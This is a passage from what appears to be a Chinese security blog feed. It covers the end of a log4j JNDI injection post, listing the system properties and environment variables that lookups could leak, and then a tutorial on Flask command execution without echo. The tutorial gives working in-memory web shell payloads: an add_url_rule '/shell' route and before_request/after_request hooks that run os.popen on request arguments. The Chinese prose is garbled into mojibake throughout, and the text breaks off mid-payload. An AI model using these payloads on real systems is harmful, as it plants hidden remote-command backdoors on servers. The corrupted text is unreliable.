Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\localedata.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\nashorn.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\sunec.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\sunjce_provider.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\sunmscapi.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\sunpkcs11.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\zipfs.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\jce.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\jfr.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\jsse.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\management-agent.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\resources.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\rt.jar;C:\Users\<span class="number">24882</span>\Desktop\java-sec\cc\target\classes;C:\Users\<span class="number">24882</span>\.m2\repository\org\apache\logging\log4j\log4j-core\<span class="number">2.14</span><span class="number">.1</span>\log4j-core-<span class="number">2.14</span><span class="number">.1</span>.jar;C:\Users\<span class="number">24882</span>\.m2\repository\org\apache\logging\log4j\log4j-api\<span class="number">2.14</span><span class="number">.1</span>\log4j-api-<span class="number">2.14</span><span class="number">.1</span>.jar;C:\Users\<span class="number">24882</span>\.m2\repository\commons-collections\commons-collections\<span class="number">3.2</span><span class="number">.1</span>\commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar;C:\Users\<span class="number">24882</span>\.m2\repository\org\apache\commons\commons-collections4\<span class="number">4.0</span>\commons-collections4-<span class="number">4.0</span>.jar;C:\Program Files\JetBrains\IntelliJ IDEA <span class="number">2024.1</span><span class="number">.1</span>\lib\idea_rt.jar</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="sysçš„å‚æ•°"><a href="#sysçš„å‚æ•°" class="headerlink" title="sysçš„å‚æ•°"></a>sysçš„å‚æ•°</h3><h4 id="1-Java-è¿è¡Œç¯å¢ƒå±æ€§"><a href="#1-Java-è¿è¡Œç¯å¢ƒå±æ€§" class="headerlink" title="1. Java è¿è¡Œç¯å¢ƒå±æ€§"></a>1. Java è¿è¡Œç¯å¢ƒå±æ€§</h4><div class="table-container"><table><thead><tr><th style="text-align:left">å±æ€§å</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">java.version</td><td style="text-align:left">Java è¿è¡Œæ—¶ç¯å¢ƒç‰ˆæœ¬</td></tr><tr><td style="text-align:left">java.vendor</td><td style="text-align:left">Java æä¾›å•†åç§°</td></tr><tr><td style="text-align:left">java.vendor.url</td><td style="text-align:left">Java æä¾›å•†çš„ URL</td></tr><tr><td style="text-align:left">java.vendor.url.bug</td><td style="text-align:left">Java æä¾›å•†çš„é”™è¯¯æŠ¥å‘Šé¡µé¢ï¼ˆJava 9+ï¼‰</td></tr><tr><td style="text-align:left">java.home</td><td style="text-align:left">Java å®‰è£…ç›®å½•</td></tr><tr><td style="text-align:left">java.class.version</td><td style="text-align:left">Java ç±»æ–‡ä»¶æ ¼å¼ç‰ˆæœ¬å·</td></tr><tr><td style="text-align:left">java.class.path</td><td style="text-align:left">Java ç±»è·¯å¾„</td></tr><tr><td style="text-align:left">java.library.path</td><td style="text-align:left">åŠ è½½åº“æ—¶æœç´¢çš„è·¯å¾„</td></tr><tr><td style="text-align:left">java.compiler</td><td style="text-align:left">JIT ç¼–è¯‘å™¨çš„åç§°ï¼ˆé€šå¸¸ä¸ºç©ºï¼‰</td></tr><tr><td style="text-align:left">java.ext.dirs</td><td style="text-align:left">Java æ‰©å±•ç›®å½•</td></tr></tbody></table></div><h4 id="2-JVM-å’Œè¿è¡Œæ—¶ç›¸å…³å±æ€§"><a href="#2-JVM-å’Œè¿è¡Œæ—¶ç›¸å…³å±æ€§" class="headerlink" title="2. JVM å’Œè¿è¡Œæ—¶ç›¸å…³å±æ€§"></a>2. JVM å’Œè¿è¡Œæ—¶ç›¸å…³å±æ€§</h4><div class="table-container"><table><thead><tr><th style="text-align:left">å±æ€§å</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">java.vm.name</td><td style="text-align:left">Java è™šæ‹Ÿæœºåç§°</td></tr><tr><td style="text-align:left">java.vm.vendor</td><td style="text-align:left">Java è™šæ‹Ÿæœºæä¾›å•†</td></tr><tr><td style="text-align:left">java.vm.version</td><td style="text-align:left">Java è™šæ‹Ÿæœºç‰ˆæœ¬</td></tr><tr><td style="text-align:left">java.vm.info</td><td style="text-align:left">Java è™šæ‹Ÿæœºå®ç°ç‰ˆæœ¬å’Œæ„å»ºä¿¡æ¯</td></tr><tr><td style="text-align:left">java.vm.specification.name</td><td style="text-align:left">Java è™šæ‹Ÿæœºè§„èŒƒåç§°</td></tr><tr><td style="text-align:left">java.vm.specification.vendor</td><td style="text-align:left">Java è™šæ‹Ÿæœºè§„èŒƒæä¾›å•†</td></tr><tr><td style="text-align:left">java.vm.specification.version</td><td style="text-align:left">Java è™šæ‹Ÿæœºè§„èŒƒç‰ˆæœ¬</td></tr></tbody></table></div><h4 id="3-æ“ä½œç³»ç»Ÿç›¸å…³å±æ€§"><a href="#3-æ“ä½œç³»ç»Ÿç›¸å…³å±æ€§" class="headerlink" title="3. æ“ä½œç³»ç»Ÿç›¸å…³å±æ€§"></a>3. æ“ä½œç³»ç»Ÿç›¸å…³å±æ€§</h4><div class="table-container"><table><thead><tr><th style="text-align:left">å±æ€§å</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">os.name</td><td style="text-align:left">æ“ä½œç³»ç»Ÿåç§°</td></tr><tr><td style="text-align:left">os.arch</td><td style="text-align:left">æ“ä½œç³»ç»Ÿæ¶æ„ï¼ˆå¦‚ x86, amd64ï¼‰</td></tr><tr><td style="text-align:left">os.version</td><td style="text-align:left">æ“ä½œç³»ç»Ÿç‰ˆæœ¬</td></tr><tr><td style="text-align:left">file.separator</td><td style="text-align:left">æ–‡ä»¶åˆ†éš”ç¬¦ï¼ˆLinux æ˜¯ /ï¼ŒWindows æ˜¯ \ï¼‰</td></tr><tr><td style="text-align:left">path.separator</td><td style="text-align:left">è·¯å¾„åˆ†éš”ç¬¦ï¼ˆLinux æ˜¯ :ï¼ŒWindows æ˜¯ ;ï¼‰</td></tr><tr><td style="text-align:left">line.separator</td><td style="text-align:left">è¡Œåˆ†éš”ç¬¦ï¼ˆLinux æ˜¯ \nï¼ŒWindows æ˜¯ \r\nï¼‰</td></tr></tbody></table></div><h4 id="4-ç”¨æˆ·ç›¸å…³å±æ€§"><a href="#4-ç”¨æˆ·ç›¸å…³å±æ€§" class="headerlink" title="4. ç”¨æˆ·ç›¸å…³å±æ€§"></a>4. ç”¨æˆ·ç›¸å…³å±æ€§</h4><div class="table-container"><table><thead><tr><th style="text-align:left">å±æ€§å</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">user.name</td><td style="text-align:left">å½“å‰ç”¨æˆ·çš„ç”¨æˆ·å</td></tr><tr><td style="text-align:left">user.home</td><td style="text-align:left">å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•</td></tr><tr><td style="text-align:left">user.dir</td><td style="text-align:left">å½“å‰å·¥ä½œç›®å½•</td></tr><tr><td style="text-align:left">user.language</td><td style="text-align:left">ç”¨æˆ·çš„é»˜è®¤è¯­è¨€</td></tr><tr><td style="text-align:left">user.country</td><td style="text-align:left">ç”¨æˆ·çš„é»˜è®¤å›½å®¶</td></tr><tr><td style="text-align:left">user.timezone</td><td style="text-align:left">ç”¨æˆ·çš„é»˜è®¤æ—¶åŒº</td></tr><tr><td style="text-align:left"></td></tr></tbody></table></div><h4 id="5-å›½é™…åŒ–ç›¸å…³å±æ€§"><a href="#5-å›½é™…åŒ–ç›¸å…³å±æ€§" class="headerlink" title="5. å›½é™…åŒ–ç›¸å…³å±æ€§"></a>5. å›½é™…åŒ–ç›¸å…³å±æ€§</h4><div class="table-container"><table><thead><tr><th style="text-align:left">å±æ€§å</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">file.encoding</td><td style="text-align:left">æ–‡ä»¶ç¼–ç </td></tr><tr><td style="text-align:left">sun.jnu.encoding</td><td style="text-align:left">Java ç¼–è¯‘å™¨ä½¿ç”¨çš„æ–‡ä»¶ç¼–ç </td></tr><tr><td style="text-align:left">sun.cpu.isalist</td><td style="text-align:left">å½“å‰ç³»ç»Ÿæ”¯æŒçš„ CPU æŒ‡ä»¤é›†</td></tr><tr><td style="text-align:left">sun.desktop</td><td style="text-align:left">æ¡Œé¢ç¯å¢ƒåç§°ï¼ˆå¦‚ windowsã€gnomeï¼‰</td></tr></tbody></table></div><h4 id="6-ç‰¹æ®Šå±æ€§ï¼ˆä¾›åº”å•†æ‰©å±•ï¼‰"><a href="#6-ç‰¹æ®Šå±æ€§ï¼ˆä¾›åº”å•†æ‰©å±•ï¼‰" class="headerlink" title="6. ç‰¹æ®Šå±æ€§ï¼ˆä¾›åº”å•†æ‰©å±•ï¼‰"></a>6. ç‰¹æ®Šå±æ€§ï¼ˆä¾›åº”å•†æ‰©å±•ï¼‰</h4><div class="table-container"><table><thead><tr><th style="text-align:left">å±æ€§å</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">sun.arch.data.model</td><td style="text-align:left">JVM æ•°æ®æ¨¡å‹ï¼ˆ32 ä½æˆ– 64 ä½ï¼‰</td></tr><tr><td style="text-align:left">sun.boot.library.path</td><td style="text-align:left">JVM å¼•å¯¼åº“çš„è·¯å¾„</td></tr><tr><td style="text-align:left">java.specification.name</td><td style="text-align:left">Java è¿è¡Œç¯å¢ƒè§„èŒƒçš„åç§°</td></tr><tr><td style="text-align:left">java.specification.vendor</td><td style="text-align:left">Java è¿è¡Œç¯å¢ƒè§„èŒƒçš„æä¾›å•†</td></tr><tr><td style="text-align:left">java.specification.version</td><td style="text-align:left">Java è¿è¡Œç¯å¢ƒè§„èŒƒçš„ç‰ˆæœ¬</td></tr></tbody></table></div><h3 id="env"><a href="#env" class="headerlink" title="env"></a>env</h3><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/58.png" class="" title="alt text"><p>envä¹Ÿå¯ä»¥è¿›è¡Œç¯å¢ƒå˜é‡çš„è¯»å–ç™»</p><h3 id="envå‚æ•°"><a href="#envå‚æ•°" class="headerlink" title="envå‚æ•°"></a>envå‚æ•°</h3><div class="table-container"><table><thead><tr><th style="text-align:left">ç¯å¢ƒå˜é‡å</th><th style="text-align:left">è¯´æ˜</th><th style="text-align:left">ç¤ºä¾‹å€¼</th></tr></thead><tbody><tr><td style="text-align:left">PATH</td><td style="text-align:left">å¯æ‰§è¡Œæ–‡ä»¶çš„æœç´¢è·¯å¾„</td><td style="text-align:left">/usr/bin:/bin:/usr/local/bin</td></tr><tr><td style="text-align:left">HOME</td><td style="text-align:left">å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•</td><td style="text-align:left">/home/user æˆ– C:\Users\User</td></tr><tr><td style="text-align:left">USER</td><td style="text-align:left">å½“å‰ç™»å½•çš„ç”¨æˆ·å</td><td style="text-align:left">root æˆ– john_doe</td></tr><tr><td style="text-align:left">SHELL</td><td style="text-align:left">å½“å‰ä½¿ç”¨çš„ shell ç¨‹åº</td><td style="text-align:left">/bin/bash æˆ– /bin/zsh</td></tr><tr><td style="text-align:left">JAVA_HOME</td><td style="text-align:left">Java å®‰è£…è·¯å¾„</td><td style="text-align:left">/usr/lib/jvm/java-17-openjdk</td></tr><tr><td style="text-align:left">CLASSPATH</td><td style="text-align:left">Java ç±»è·¯å¾„</td><td style="text-align:left">.:/lib:/usr/lib</td></tr><tr><td style="text-align:left">TEMP / TMP</td><td style="text-align:left">ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•</td><td style="text-align:left">/tmp æˆ– C:\Windows\Temp</td></tr><tr><td style="text-align:left">OS</td><td style="text-align:left">æ“ä½œç³»ç»Ÿåç§°ï¼ˆWindows ç‰¹æœ‰ï¼‰</td><td style="text-align:left">Windows_NT</td></tr><tr><td style="text-align:left">COMPUTERNAME</td><td style="text-align:left">å½“å‰è®¡ç®—æœºåï¼ˆWindows ç‰¹æœ‰ï¼‰</td><td style="text-align:left">MY-PC</td></tr><tr><td style="text-align:left">USERNAME</td><td style="text-align:left">å½“å‰ç”¨æˆ·çš„ç”¨æˆ·åï¼ˆWindows ç‰¹æœ‰ï¼Œä¸ USER ç±»ä¼¼ï¼‰</td><td style="text-align:left">Administrator</td></tr><tr><td style="text-align:left">PWD</td><td style="text-align:left">å½“å‰å·¥ä½œç›®å½•ï¼ˆLinux/macOSï¼‰</td><td style="text-align:left">/home/user/project</td></tr><tr><td style="text-align:left">LOGNAME</td><td style="text-align:left">å½“å‰ç”¨æˆ·çš„ç™»å½•åï¼ˆLinux/macOSï¼‰</td><td style="text-align:left">john_doe</td></tr><tr><td style="text-align:left">EDITOR</td><td style="text-align:left">é»˜è®¤çš„æ–‡æœ¬ç¼–è¾‘å™¨</td><td style="text-align:left">vim æˆ– nano æˆ– notepad</td></tr><tr><td style="text-align:left">LANG</td><td style="text-align:left">ç³»ç»Ÿçš„è¯­è¨€å’Œåœ°åŒºè®¾ç½®</td><td style="text-align:left">en_US.UTF-8 æˆ– zh_CN.UTF-8</td></tr><tr><td style="text-align:left">LC_ALL</td><td style="text-align:left">è¦†ç›–å…¶ä»–è¯­è¨€å’Œåœ°åŒºè®¾ç½®</td><td style="text-align:left">en_US.UTF-8</td></tr><tr><td style="text-align:left">HOSTNAME</td><td style="text-align:left">å½“å‰ä¸»æœºåï¼ˆLinux/macOSï¼‰</td><td style="text-align:left">my-host</td></tr><tr><td style="text-align:left">DISPLAY</td><td style="text-align:left">å›¾å½¢æ˜¾ç¤ºè®¾å¤‡ï¼ˆX11 å›¾å½¢ç³»ç»Ÿï¼‰</td><td style="text-align:left">:0</td></tr><tr><td style="text-align:left">XDG_SESSION_TYPE</td><td style="text-align:left">å½“å‰ä¼šè¯ç±»å‹ï¼ˆLinux æ¡Œé¢ç¯å¢ƒï¼‰</td><td style="text-align:left">x11 æˆ– wayland</td></tr><tr><td style="text-align:left">XDG_CURRENT_DESKTOP</td><td style="text-align:left">å½“å‰æ¡Œé¢ç¯å¢ƒåç§°</td><td style="text-align:left">GNOME æˆ– KDE</td></tr><tr><td style="text-align:left">MAIL</td><td style="text-align:left">å½“å‰ç”¨æˆ·çš„é‚®ç®±ç›®å½•è·¯å¾„</td><td style="text-align:left">/var/mail/user</td></tr><tr><td style="text-align:left">SSH_CLIENT</td><td style="text-align:left">å½“å‰ SSH å®¢æˆ·ç«¯è¿æ¥ä¿¡æ¯</td><td style="text-align:left">192.168.1.10 22 192.168.1.2</td></tr><tr><td style="text-align:left">SSH_CONNECTION</td><td style="text-align:left">å½“å‰ SSH è¿æ¥è¯¦ç»†ä¿¡æ¯</td><td style="text-align:left">192.168.1.10 22 192.168.1.2 5678</td></tr><tr><td style="text-align:left">SSH_TTY</td><td style="text-align:left">å½“å‰ SSH ä¼šè¯ä½¿ç”¨çš„ä¼ªç»ˆç«¯è·¯å¾„</td><td style="text-align:left">/dev/pts/0</td></tr><tr><td style="text-align:left">TERM</td><td style="text-align:left">å½“å‰ç»ˆç«¯ç±»å‹</td><td style="text-align:left">xterm-256color æˆ– screen</td></tr><tr><td style="text-align:left">UID</td><td style="text-align:left">å½“å‰ç”¨æˆ·çš„ç”¨æˆ· IDï¼ˆLinux/macOSï¼‰</td><td style="text-align:left">1000 æˆ– 0ï¼ˆè¡¨ç¤º root ç”¨æˆ·ï¼‰</td></tr><tr><td style="text-align:left">GID</td><td style="text-align:left">å½“å‰ç”¨æˆ·çš„ç»„ ID</td><td style="text-align:left">1000</td></tr><tr><td style="text-align:left">OLDPWD</td><td style="text-align:left">ä¸Šä¸€ä¸ªå·¥ä½œç›®å½•ï¼ˆLinux/macOSï¼‰</td><td style="text-align:left">/home/user/previous_project</td></tr><tr><td style="text-align:left">http_proxy</td><td style="text-align:left">HTTP ä»£ç†æœåŠ¡å™¨åœ°å€</td><td style="text-align:left"><a href="http://proxy.example.com:8080">http://proxy.example.com:8080</a></td></tr><tr><td style="text-align:left">https_proxy</td><td style="text-align:left">HTTPS ä»£ç†æœåŠ¡å™¨åœ°å€</td><td style="text-align:left"><a href="https://proxy.example.com:8080">https://proxy.example.com:8080</a></td></tr><tr><td style="text-align:left">NO_PROXY</td><td style="text-align:left">ä¸ä½¿ç”¨ä»£ç†çš„åœ°å€</td><td style="text-align:left">localhost,127.0.0.1</td></tr><tr><td style="text-align:left">APPDATA</td><td style="text-align:left">åº”ç”¨æ•°æ®ç›®å½•è·¯å¾„ï¼ˆWindows ç‰¹æœ‰ï¼‰</td><td style="text-align:left">C:\Users\User\AppData\Roaming</td></tr><tr><td style="text-align:left">PROGRAMFILES</td><td style="text-align:left">é»˜è®¤å®‰è£…ç¨‹åºçš„ç›®å½•ï¼ˆWindows ç‰¹æœ‰ï¼‰</td><td style="text-align:left">C:\Program Files</td></tr><tr><td style="text-align:left">WINDIR</td><td style="text-align:left">Windows ç³»ç»Ÿç›®å½•è·¯å¾„ï¼ˆWindows ç‰¹æœ‰ï¼‰</td><td style="text-align:left">C:\Windows</td></tr></tbody></table></div><p>è€Œè¿™ä¸ªlog4jçš„æ¼æ´åœ¨2.15ä¹‹åå°±å·²ç»ä¿®å¤äº†ï¼Œ2.15ç‰ˆæœ¬å°†lookupç»™ç¦äº†ï¼Œç»è¿‡åœ¨æœ¬åœ°å°è¯•åƒsysï¼Œenvè¿™ç§è·å–æ•æ„Ÿä¿¡æ¯çš„æ–¹å¼ä¹Ÿæ— æ³•ä½¿ç”¨äº†</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> JNDI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonæ— å›æ˜¾ä¸‹çš„å‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="å…³äºpythonå‘½ä»¤æ‰§è¡Œä¸å‡ºç½‘æ— å›æ˜¾çš„æƒ…å†µä¸‹ä¸»è¦åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œå¼€å¯debugæœªå¼€å¯debug"><a href="#å…³äºpythonå‘½ä»¤æ‰§è¡Œä¸å‡ºç½‘æ— å›æ˜¾çš„æƒ…å†µä¸‹ä¸»è¦åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œå¼€å¯debugæœªå¼€å¯debug" class="headerlink" title="å…³äºpythonå‘½ä»¤æ‰§è¡Œä¸å‡ºç½‘æ— å›æ˜¾çš„æƒ…å†µä¸‹ä¸»è¦åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œå¼€å¯debugæœªå¼€å¯debug"></a>å…³äºpythonå‘½ä»¤æ‰§è¡Œä¸å‡ºç½‘æ— å›æ˜¾çš„æƒ…å†µä¸‹ä¸»è¦åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œå¼€å¯debugæœªå¼€å¯debug</h1><h1 id="å¼€å¯debug"><a href="#å¼€å¯debug" class="headerlink" title="å¼€å¯debug"></a>å¼€å¯debug</h1><p>ä½¿ç”¨<code>exec(&quot;raise%20Exception(__import__(%27os%27).popen(%27whoami%27).read())&quot;)</code>æ¥è¿›è¡ŒæŠ¥é”™è¾“å‡ºå‘½ä»¤æ‰§è¡Œç»“æœ</p><h1 id="æœªå¼€å¯debug"><a href="#æœªå¼€å¯debug" class="headerlink" title="æœªå¼€å¯debug"></a>æœªå¼€å¯debug</h1><h2 id="add-url-route"><a href="#add-url-route" class="headerlink" title="add_url_route"></a>add_url_route</h2><p>åœ¨è€ç‰ˆæœ¬çš„flaskåœ¨è¿›è¡Œè¯·æ±‚åä»ç„¶æ˜¯å¯ä»¥é€šè¿‡add<em>url<em>routeæ¥æ·»åŠ è·¯ç”±çš„ï¼Œä½†æ˜¯æ–°ç‰ˆæœ¬å¯¹å…¶è¿›è¡Œäº†ä¿®æ”¹å¯¼è‡´å…¶æ— æ³•æ³¨å…¥å†…å­˜é©¬ï¼Œä½†æ˜¯è€ç‰ˆæœ¬è¿˜æ˜¯å¯ä»¥ä½¿ç”¨çš„<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].add_url_rule(<span class="string">&#x27;/shell&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;shell&#x27;</span>)).read())</span><br></pre></td></tr></table></figure><br>é€šè¿‡`sys.modules[â€˜<strong>main</strong>â€˜].__dict</em></em>[â€˜appâ€™]<code>è·å–è¯¥flaskä¸‹çš„appã€‚è€Œåè°ƒç”¨add_url_ruleã€‚</code>def add_url_rule(self,rule: str,endpoint: str | None = None,view_func: ft.RouteCallable | None = None,provide_automatic_options: bool | None = None,**options: t.Any,)`<br>æˆ‘ä»¬ä½¿ç”¨çš„å†…å­˜é©¬çš„ä¸‰ä¸ªå‚æ•°ç¬¬ä¸€ä¸ªæ˜¯è·¯ç”±ï¼Œç¬¬äºŒä¸ªæ˜¯ç«¯ç‚¹ï¼Œç¬¬ä¸‰ä¸ªå°±æ˜¯åˆ©ç”¨äº†lambdaæ¥å®šä¹‰ä¸€ä¸ªåŒ¿åå‡½æ•°ã€‚æ­¤å‡½æ•°ä½œä¸ºè¯¥è·¯ç”±çš„è§†å›¾å‡½æ•°ï¼Œè¿™æ ·åªè¦ä½¿ç”¨evalæˆ–execæ¥æ‰§è¡Œå¦‚ä¸Šå‘½ä»¤ï¼Œå°±å¯ä»¥åˆ›å»ºä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„è·¯ç”±ã€‚</p><h2 id="åˆ©ç”¨é’©å­å‡½æ•°"><a href="#åˆ©ç”¨é’©å­å‡½æ•°" class="headerlink" title="åˆ©ç”¨é’©å­å‡½æ•°"></a>åˆ©ç”¨é’©å­å‡½æ•°</h2><h3 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h3><p>before_request è¿™ä¸ªæ–¹æ³•å¯ä»¥è®©æˆ‘ä»¬åœ¨æ¯æ¬¡è¯·æ±‚æ—¶æ‰§è¡Œè¿è¡Œæ“ä½œã€‚<br><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png" class="" title="alt text"><br>æ­¥å…¥è¿™ä¸ªå‡½æ•°å¯ä»¥å‘ç°å¦‚ä¸‹ä»£ç <br><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png" class="" title="alt text"><br>å¯ä»¥å‘ç°å…¶å®æˆ‘ä»¬å®šä¹‰çš„è¯†å›¾å‡½æ•°å°±æ˜¯ä¼ å…¥çš„fï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>app.before_request_funcs.setdefault(None, []).append(lambda a:xxxxx)</code>é€šè¿‡ä¼ å…¥åŒ¿åå‡½æ•°æ¥è¿›è¡Œåœ¨æ¯æ¬¡è¯·æ±‚æ—¶éƒ½æ‰§è¡Œè¿™ä¸ªåŒ¿åå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªåŒ¿åå‡½æ•°ä¸ºåé—¨æ—¶å°±ä¼šæˆåŠŸåœ¨æ¯æ¬¡è¯·æ±‚å‰éƒ½å‘½ä»¤æ‰§è¡Œ<br>payloadå¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].before_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;shell&#x27;</span>)).read())</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ifè¯­å¥æ¥å¯¹å†…å­˜é©¬è¿›è¡Œæ”¹é€ è®©å…¶çœ‹çš„æ›´èˆ’æœ<br><img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png" class="" title="alt text"><br>ä½†æ˜¯ä½¿ç”¨å¦‚ä¸Špayloadä¼šå¯¼è‡´æ­£å¸¸ä¸šåŠ¡é€»è¾‘å‡ºç°é—®é¢˜ï¼Œ<img src="/2024/10/07/python%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png" class="" title="alt text"><br>å› ä¸ºè¿™æ˜¯åœ¨è¯·æ±‚å‰å°±è¿è¡Œäº†è¿™ä¸ªå‡½æ•°ï¼Œå¯¼è‡´å“åº”è¢«æå‰è¿”å›è¿™å°±å¯¼è‡´äº†ä¸šåŠ¡é€»è¾‘å‡ºç°é”™è¯¯ã€‚è¿™å°±éœ€è¦ä¸‹é¢çš„after_requestå‡½æ•°æ¥è¿›è¡Œä¸å½±å“ä¸šåŠ¡é€»è¾‘çš„å†…å­˜é©¬æ³¨å…¥ã€‚</p><h3 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp:<span class="built_in">__import__</span>(<span class="string">&#x27;flask&#x27;</span>).make_response(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;shell&#x27;</span>)).read()))</span><br></pre></td></tr></table></figure><p>after_requestå’Œå‰é¢ä¸€ä¸ªç±»ä¼¼,åªæ˜¯è¯¥å‡½æ•°æ˜¯æ¯ä¸ªè¯·æ±‚åè¿è¡Œä¸€æ¬¡è¿™ä¸ªå‡½æ•°ï¼Œä¸”è§†å›¾å‡½æ•°çš„å‚æ•°å°±æ˜¯responseå¯¹è±¡ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦å¥–ä¸Šé¢çš„payloadè¿›è¡Œæ”¹é€ ç„¶å…¶åœ¨æœªè¾“å…¥shellå‚æ•°æ—¶è¿”å›æˆ‘ä»¬çš„responseå³å¯è®©ä¸šåŠ¡é€»è¾‘æ­£å¸¸è¿›è¡Œå¦‚ä¸‹<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp:<span class="built_in">__import__</span>(<span class="string">&#x27;flask&#x27;</span>).make_response(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;shell&#x27;</span>)).read())<span class="keyword">if</span> request.args.get(<span class="string">&#x27;shell&#x27;</span>) <span class="keyword">else</span> resp)</span><br></pre></td></tr></table></figure><br>è¿˜å¯ä»¥åœ¨åˆ¤æ–­è¯­å¥ä¸­åŠ request.path.startswith(â€œ/shellâ€)æ¥è§„å®šåœ¨ä»€ä¹ˆè·¯ç”±ä¸‹æ‰ä¼šè¿”å›å‘½ä»¤æ‰§è¡Œçš„å†…å®¹å¦‚ä¸‹</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp:<span class="built_in">__import__</span>(<span class="string">&#x27;flask&#x27;</span>).make_response(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span 